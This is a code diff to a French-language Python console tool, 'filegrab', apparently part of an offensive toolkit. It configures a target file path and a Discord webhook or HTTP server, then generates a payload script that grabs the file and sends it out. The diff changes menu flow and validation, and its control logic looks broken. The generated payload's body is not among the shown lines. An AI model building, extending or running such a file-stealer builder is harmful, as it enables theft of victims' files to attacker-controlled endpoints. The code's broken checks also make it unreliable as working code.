@@ -1,5 +1,5 @@
 ###A FINIR
-
+import time
 import os
 from colorama import Fore, Style, init
 
@@ -22,7 +22,7 @@ def affichage():
 
 
 {Fore.WHITE}2. Envoi par Discord
-3. URL serveur HTTP
+3. Envoi par serveur HTTP
 
 {Fore.GREEN}
 Tapez : set <num> pour configurer
@@ -36,8 +36,8 @@ def filegrab():
 
     choix = {
         "Chemin du fichier": None,
-        "Envoi par Discord": None,
-        "Serveur HTTP": None
+        "Envoi sur Discord": None,
+        "Envoi sur serveur HTTP": None
     }
 
     def chemin_option():
@@ -47,44 +47,53 @@ def filegrab():
         if os.path.isfile(fichier):
             choix["Chemin du fichier"] = fichier
         else:
-            print("Le chemin spécifié n'est pas valide.")
-            input("Entrée...")
+            input("Le chemin spécifié n'est pas valide.")
+        affichage()
+            
 
     def discord_option():
         clear()
         discord = input("Entrez le webhook Discord pour l'envoi (laisser vide pour ne pas envoyer) : ")
 
         if discord:
-            choix["Envoi par Discord"] = discord
+            choix["Envoi sur Discord"] = discord
         else:
-            choix["Envoi par Discord"] = None
+            choix["Envoi sur Discord"] = None
+        affichage()
+
 
     def http_option():
         clear()
         http = input("Entrez l'URL du serveur HTTP : ")
 
         if http:
-            choix["Serveur HTTP"] = http
+            choix["Envoi sur serveur HTTP"] = http
         else:
-            choix["Serveur HTTP"] = None
+            choix["Envoi sur serveur HTTP"] = None
+        affichage()
 
-    def show_config():
-        clear()
-        print("=== Configuration actuelle ===\n")
 
-        for key, value in choix.items():
-            print(f"{key} : {value}")
-
-        input("\nEntrée pour continuer...")
+    def controle():
+        if choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
+            print(Fore.RED + "Erreur : Choisissez un seul mode d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
+            time.sleep(2)
+            choix["Envoi sur Discord"] = None
+            choix["Envoi sur serveur HTTP"] = None
+        else:
+            return True
+        if not choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
+            print(Fore.RED + "Erreur : Choisissez un mode d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
+            time.sleep(2)
+            return False
 
     def create_payload():
         clear()
 
         print("=== Script Généré ===\n")
 
-        if not choix["Chemin du fichier"] or not choix["Serveur HTTP"]:
-            print("Configuration incomplète.")
-            input("Entrée...")
+        if not choix["Chemin du fichier"] or not choix["Envoi sur serveur HTTP"] or choix["Envoi sur Discord"]:
+            input("Configuration incomplète.")
+            affichage()
             return
 
         payload = f"""
@@ -138,6 +147,8 @@ else:
             print("\nConfiguration actuelle du module Screenshot :")
             for key, value in choix.items():
                 print(f"{key}: {value}")
+            input("\nAppuyez sur Entrée pour continuer...")
+            affichage()
 
         if cmd.lower() == "create":
             controle()
@@ -145,4 +156,3 @@ else:
             break
 
 
-filegrab()
